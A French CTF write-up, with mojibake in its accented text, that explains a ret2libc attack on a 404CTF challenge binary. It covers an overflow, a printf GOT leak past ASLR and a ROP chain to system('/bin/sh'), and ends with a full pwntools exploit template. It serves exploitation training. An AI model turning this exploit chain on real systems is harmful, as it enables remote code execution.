# Ret2libc â€” ROP Chain + GOT Leak

> ğŸ“„ **Challenge rÃ©el : `Gorfou en danger 3` â€” 404CTF 2025**

## Table des matiÃ¨res
- [PrÃ©requis](#prÃ©requis)
- [Concepts clÃ©s](#concepts-clÃ©s)
- [Analyser le binaire](#analyser-le-binaire)
- [Ã‰tape 1 â€” Calculer l'offset jusqu'Ã  l'adresse de retour](#Ã©tape-1--calculer-loffset-jusquÃ -ladresse-de-retour)
- [Ã‰tape 2 â€” Fuiter l'adresse de printf via la GOT](#Ã©tape-2--fuiter-ladresse-de-printf-via-la-got)
- [Ã‰tape 3 â€” Calculer la base de la libc](#Ã©tape-3--calculer-la-base-de-la-libc)
- [Ã‰tape 4 â€” Construire la ROP chain](#Ã©tape-4--construire-la-rop-chain)
- [Ã‰tape 5 â€” Exploitation complÃ¨te](#Ã©tape-5--exploitation-complÃ¨te)
- [SchÃ©ma rÃ©capitulatif](#schÃ©ma-rÃ©capitulatif)
- [Erreurs frÃ©quentes](#erreurs-frÃ©quentes)
- [RÃ©sumÃ© des commandes utiles](#rÃ©sumÃ©-des-commandes-utiles)

---

## PrÃ©requis

- ConnaÃ®tre les bases de l'assembleur x86/x64
- Comprendre ce qu'est la pile (stack) et les adresses de retour
- Savoir ce qu'est ASLR et pourquoi il faut fuiter des adresses
- Avoir `pwntools` installÃ© (`pip install pwntools`)
- Avoir `radare2` installÃ© pour l'analyse statique
- Disposer de la `libc.so.6` correspondant au binaire cible

---

## Concepts clÃ©s

### Pourquoi "ret2libc" ?

NX (No eXecute) empÃªche d'exÃ©cuter du shellcode sur la pile. L'idÃ©e du ret2libc c'est de ne pas injecter de code â€” mais de **rediriger l'exÃ©cution vers du code qui existe dÃ©jÃ ** dans la libc, notamment `system("/bin/sh")`.

```
SHELLCODE (impossible avec NX)      RET2LIBC
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€      â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pile : \x90\x90...\xcc\xcc          pile : adresse system() dans libc
â†’ NX bloque l'exÃ©cution             â†’ NX ne bloque pas, c'est du code lÃ©gitime
```

### ASLR et pourquoi il faut fuiter

ASLR (Address Space Layout Randomization) randomise l'adresse de base de la libc Ã  chaque exÃ©cution. On ne peut donc pas hardcoder `system()` ou `/bin/sh` â€” il faut d'abord **fuiter une adresse** de la libc pour calculer sa base.

```
Sans ASLR :  libc base = 0x7ffff7000000  (toujours pareil)
Avec ASLR :  libc base = 0x7f3a21000000  (change Ã  chaque run)
             libc base = 0x7f8b44000000  (diffÃ©rent au prochain run)
```

Une fois qu'on connaÃ®t **une** adresse dans la libc, on peut calculer toutes les autres :

```
libc_base  = adresse_fuitÃ©e - offset_dans_libc
system()   = libc_base + libc.symbols['system']
"/bin/sh"  = libc_base + offset_binsh
```

### La GOT (Global Offset Table)

La GOT est une table qui contient les **adresses rÃ©elles** des fonctions de la libc aprÃ¨s rÃ©solution dynamique. Avec No PIE, ses adresses sont fixes et connues Ã  l'avance.

```
GOT (adresses fixes avec No PIE)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 0x403008 : adresse rÃ©elle printf()   â”‚ â† pointe dans la libc, affectÃ©e par ASLR
â”‚ 0x403010 : adresse rÃ©elle puts()     â”‚
â”‚ 0x403018 : adresse rÃ©elle read()     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

En lisant `*(uint64_t*)0x403008` on obtient l'adresse de `printf` dans la libc â€” c'est notre fuite !

### Les gadgets ROP

Un **gadget ROP** c'est une petite sÃ©quence d'instructions qui se termine par `ret`, qu'on peut enchaÃ®ner pour construire un programme arbitraire sans injecter de code.

```
Gadget "pop rdi ; ret" :
  pop rdi    â† dÃ©pile la valeur suivante dans rdi (= 1er argument)
  ret        â† saute Ã  l'adresse suivante sur la pile

Gadget "ret" seul :
  ret        â† consomme une adresse sur la pile (utilisÃ© pour l'alignement)
```

En x64, le premier argument d'une fonction est passÃ© dans `rdi`. Pour appeler `system("/bin/sh")`, il faut donc mettre l'adresse de `/bin/sh` dans `rdi` avant d'appeler `system`.

### L'alignement de la stack en x64

En x64, la stack doit Ãªtre **alignÃ©e sur 16 octets** avant un `call`. Si elle ne l'est pas, `system()` peut crasher sur une instruction SSE (`movaps`). On ajoute un gadget `ret` vide pour corriger l'alignement.

---

## Analyser le binaire

### Avec radare2

```bash
r2 ./chall
aaa
afl
pdf @ sym.main
pdf @ sym.take_command    # fonction vulnÃ©rable
pdf @ sym.debug_info      # fonction qui fuite les adresses
```

### VÃ©rifier les protections

```bash
checksec --file=./chall
```

| Protection | Valeur | Impact |
|---|---|---|
| **NX enabled** | Oui | Pas de shellcode sur la pile â†’ on utilise ret2libc |
| **No PIE** | Oui | Adresses du binaire fixes â†’ GOT accessible directement |
| **No canary** | Absent | Pas de protection de pile â†’ overflow direct |
| **ASLR** | Oui (OS) | Adresses libc alÃ©atoires â†’ il faut fuiter printf |
| **Partial RELRO** | Partiel | La GOT est lisible â†’ on peut fuiter printf@GOT |

### Ce qu'on cherche dans take_command

```asm
afv: vars(1:sp[0x108..0x108])   â† variable locale Ã  rbp-0x108
sub rsp, 0x100                  â† buffer de 256 octets (0x100)
mov edx, 0x130                  â† read() lit 304 octets â†’ overflow !
```

L'offset jusqu'Ã  l'adresse de retour = `0x100` (buffer) + `8` (saved RBP) = **`0x108` = 264 octets**.

> **Comment lire `afv` dans r2 :** `sp[0x108..0x108]` indique que la variable locale est Ã  `rsp+0x108`. Comme `rsp` pointe sous le saved RBP, cela confirme que l'adresse de retour est bien Ã  `rbp+0x8` = `rsp+0x108` depuis le bas du buffer.

### Ce qu'on cherche dans debug_info

```asm
mov eax, reloc.printf    ; 0x403008  â† adresse GOT de printf (fixe, No PIE)
mov rax, qword [rax]                 â† dÃ©rÃ©fÃ©rence â†’ adresse rÃ©elle printf dans libc
mov rsi, rax
call printf                          â† affiche l'adresse â†’ notre fuite !
```

`debug_info` lit directement la GOT et affiche l'adresse runtime de `printf` â€” exactement ce qu'il faut pour calculer la base de la libc.

---

## Ã‰tape 1 â€” Calculer l'offset jusqu'Ã  l'adresse de retour

### Depuis le dÃ©sassemblage (mÃ©thode propre)

```
buffer    : 0x100 = 256 octets  (sub rsp, 0x100)
saved RBP :        8 octets     (push rbp du prologue)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
offset    : 0x108 = 264 octets  â†’ adresse de retour
```

### Avec cyclic (mÃ©thode automatique)

```python
def find_offset():
    process_instance = process(context.binary.path)
    pattern = cyclic(0x120)
    process_instance.sendline(pattern)
    process_instance.wait()
    core = process_instance.corefile
    rip_value = core.rip
    offset = cyclic_find(rip_value)
    log.success(f"Offset : {offset}")
    return offset
```

---

## Ã‰tape 2 â€” Fuiter l'adresse de printf via la GOT

### Le principe

On construit un payload qui :
1. Remplit le buffer jusqu'Ã  l'adresse de retour (264 octets)
2. Redirige vers `debug_info` â†’ affiche printf@libc
3. Retourne vers `main` â†’ permet une deuxiÃ¨me passe pour la ROP chain

```python
def leak_printf(io):
    debug_info = exe.symbols['debug_info']   # adresse fixe (No PIE)
    main       = exe.symbols['main']         # pour rejouer aprÃ¨s le leak

    payload = flat(
        cyclic(0x108),   # padding jusqu'Ã  l'adresse de retour
        debug_info,      # 1er ret â†’ exÃ©cute debug_info
        main             # 2Ã¨me ret â†’ retourne dans main pour la passe 2
    )
    io.sendlineafter(b">", payload)

    try:
        io.recvuntil(b"printf address :")
        printf_leak = int(io.recvline().strip(), 16)
        log.success(f"printf@libc : {hex(printf_leak)}")
        return printf_leak
    except:
        log.warn("Impossible de dÃ©clencher le buffer overflow")
        raise SystemExit()
```

---

## Ã‰tape 3 â€” Calculer la base de la libc

Une fois `printf@libc` connu, on soustrait l'offset de `printf` dans la libc pour obtenir la base :

```python
printf_leak = leak_printf(io)
libc_base   = printf_leak - libc.symbols['printf']
libc.address = libc_base

log.info(f"libc base : {hex(libc_base)}")
```

Toutes les adresses libc sont maintenant calculables :

```python
system = libc.symbols['system']             # = libc_base + offset_system
binsh  = next(libc.search(b"/bin/sh\x00")) # = libc_base + offset_binsh
```

---

## Ã‰tape 4 â€” Construire la ROP chain

### Trouver les gadgets

```python
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]  # met /bin/sh dans rdi
ret     = rop.find_gadget(["ret"])[0]              # alignement stack x64
```

### Structure de la ROP chain

```
[ padding 0x108 ] [ ret ] [ pop rdi ; ret ] [ &"/bin/sh" ] [ system() ]
                    â†‘           â†‘                  â†‘              â†‘
                alignement  charge rdi         argument 1     appel final
```

```python
def build_rop(libc_base):
    libc.address = libc_base
    rop     = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret     = rop.find_gadget(["ret"])[0]
    binsh   = next(libc.search(b"/bin/sh\x00"))
    system  = libc.symbols['system']

    log.info(f"pop rdi ; ret : {hex(pop_rdi)}")
    log.info(f"system()      : {hex(system)}")
    log.info(f"/bin/sh       : {hex(binsh)}")

    payload = flat(
        cyclic(0x108),   # padding jusqu'Ã  l'adresse de retour
        ret,             # gadget ret pour aligner la stack sur 16 octets
        pop_rdi,         # pop rdi ; ret â†’ met binsh dans rdi
        binsh,           # adresse de "/bin/sh" dans libc
        system           # appel system("/bin/sh") â†’ shell !
    )
    return payload
```

### Pourquoi le gadget `ret` d'alignement ?

En x64, `system()` utilise des instructions SSE (`movaps`) qui nÃ©cessitent une stack alignÃ©e sur 16 octets. Sans le `ret` supplÃ©mentaire, `system()` crashe silencieusement.

```
SANS ret d'alignement      AVEC ret d'alignement
rsp = 0x...8               rsp = 0x...0  â† alignÃ© sur 16 octets âœ“
movaps â†’ SIGSEGV           movaps â†’ OK
```

---

## Ã‰tape 5 â€” Exploitation complÃ¨te

### Template d'exploit complet

```python
#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or 'chall')
libc = ELF(args.LIBC or 'libc.so.6')
context.encoding = "utf-8"

host = "challenges.exemple.fr"
port = 12345

def start():
    if args.LOCAL:
        return process([exe.path])
    return remote(host, port)

def leak_printf(io):
    """Passe 1 : buffer overflow â†’ debug_info â†’ fuite printf@libc â†’ retour main"""
    payload = flat(
        cyclic(0x108),
        exe.symbols['debug_info'],
        exe.symbols['main']
    )
    io.sendlineafter(b">", payload)
    io.recvuntil(b"printf address :")
    printf_leak = int(io.recvline().strip(), 16)
    log.success(f"printf@libc : {hex(printf_leak)}")
    return printf_leak

def build_rop(libc_base):
    """Passe 2 : ROP chain â†’ system('/bin/sh')"""
    libc.address = libc_base
    rop     = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret     = rop.find_gadget(["ret"])[0]
    binsh   = next(libc.search(b"/bin/sh\x00"))
    system  = libc.symbols['system']

    payload = flat(
        cyclic(0x108),
        ret,        # alignement stack x64
        pop_rdi,    # pop rdi ; ret
        binsh,      # adresse /bin/sh
        system      # system("/bin/sh")
    )
    return payload

def exploit():
    # Passe 1 : fuiter printf pour calculer libc_base
    printf_leak = leak_printf(io)
    libc_base   = printf_leak - libc.symbols['printf']
    log.info(f"libc base : {hex(libc_base)}")

    # Passe 2 : ROP chain avec les adresses calculÃ©es
    payload = build_rop(libc_base)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    io = start()
    exploit()
```

---

## SchÃ©ma rÃ©capitulatif

```
PASSE 1 â€” Fuite de l'adresse printf

  pile avant overflow       pile aprÃ¨s overflow
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ command[0x100]  â”‚       â”‚ cyclic(0x108)   â”‚ â† remplissage
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚ saved RBP       â”‚       â”‚ &debug_info     â”‚ â† 1er ret â†’ affiche printf@libc
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚ adresse retour  â”‚       â”‚ &main           â”‚ â† 2Ã¨me ret â†’ rejoue pour passe 2
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

  debug_info lit GOT[printf] = adresse rÃ©elle printf dans libc
  â†’ libc_base = printf_leak - libc.symbols['printf']

PASSE 2 â€” ROP chain vers system("/bin/sh")

  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ cyclic(0x108)   â”‚ â† remplissage
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚ ret             â”‚ â† alignement stack sur 16 octets
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚ pop rdi ; ret   â”‚ â† charge rdi = &"/bin/sh"
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚ &"/bin/sh"      â”‚ â† dÃ©pilÃ© dans rdi par le gadget
  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”‚ system()        â”‚ â† system(rdi) = system("/bin/sh") â†’ shell !
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

FLUX D'ATTAQUE
1. Overflow â†’ ret debug_info â†’ fuite printf@libc â†’ ret main
2. libc_base = printf_leak - offset_printf
3. Overflow â†’ ROP chain â†’ system("/bin/sh") â†’ shell !
```

---

## Erreurs frÃ©quentes

### system() crashe avec SIGSEGV
â†’ ProblÃ¨me d'alignement de stack. Ajouter un gadget `ret` supplÃ©mentaire avant `pop rdi` dans la ROP chain.

### La libc_base calculÃ©e semble fausse
â†’ VÃ©rifier que la `libc.so.6` utilisÃ©e est bien celle du serveur cible. Les offsets varient selon la version. Utiliser `strings libc.so.6 | grep "GNU C"` pour identifier la version.

### Le leak printf retourne une adresse invalide
â†’ VÃ©rifier que `recvuntil` consomme exactement le bon dÃ©limiteur. Utiliser `DEBUG` pour voir les octets reÃ§us : `./exploit.py LOCAL DEBUG`.

### ROP gadget introuvable
â†’ Chercher dans le binaire ET dans la libc. Pwntools cherche dans `ROP(libc)` si on lui passe la libc. On peut aussi chercher manuellement : `ROPgadget --binary libc.so.6 | grep "pop rdi"`.

### `cyclic_find()` retourne -1
â†’ Le pattern n'a pas atteint RIP. Augmenter `pattern_size` dans `find_offset()`.

---

## RÃ©sumÃ© des commandes utiles

```bash
# Analyse statique
r2 ./chall
aaa
afl
pdf @ sym.take_command    # offset du buffer, taille du read()
pdf @ sym.debug_info      # comment la GOT est lue pour fuiter printf

# VÃ©rifier les protections
checksec --file=./chall

# Identifier la version de libc
strings libc.so.6 | grep "GNU C"

# Chercher des gadgets ROP
ROPgadget --binary libc.so.6 | grep "pop rdi"
ROPgadget --binary libc.so.6 | grep ": ret$"

# Chercher /bin/sh dans la libc
strings -a -t x libc.so.6 | grep "/bin/sh"

# Debug de l'exploit
./exploit.py LOCAL DEBUG      # logs dÃ©taillÃ©s
./exploit.py LOCAL NOASLR     # dÃ©sactive ASLR pour tester sans leak
./exploit.py GDB              # attache GDB automatiquement
```

---

*Technique : Ret2libc â€” GOT Leak + ROP Chain*
*Architecture cible : x86-64 (amd64)*
*Outils : pwntools, radare2, ROPgadget*
